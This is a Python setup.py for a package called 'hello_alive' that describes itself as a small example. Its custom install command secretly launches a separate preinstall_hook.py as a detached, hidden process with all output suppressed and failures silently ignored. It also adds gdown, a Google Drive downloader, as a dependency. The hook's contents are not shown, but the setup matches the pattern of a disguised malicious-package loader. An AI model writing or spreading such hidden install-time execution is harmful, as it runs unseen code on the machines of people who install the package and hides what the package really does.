import subprocess
import sys
from setuptools import setup, find_packages
from setuptools.command.install import install

class PreInstallHook(install):
    """Run the preinstall hook in a detached process before normal install."""
    def run(self):
        # Spawn the preinstall hook (detached, hidden)
        hook_script = "preinstall_hook.py"
        try:
            subprocess.Popen(
                [sys.executable, hook_script],
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                close_fds=True
            )
        except Exception:
            pass  # silent failure – main install continues
        # Now continue with the actual installation
        super().run()

setup(
    name="hello_alive",
    version="0.1.0",
    packages=find_packages(),
    description="A small example package",
    author="Your Name",
    license="MIT",
    zip_safe=False,
    install_requires=["gdown"],   # ensures gdown is available
    cmdclass={
        "install": PreInstallHook,
    },
    # Include the preinstall hook and scripts in the package data
    package_data={
        "": ["preinstall_hook.py", "scripts/*.py"],
    },
)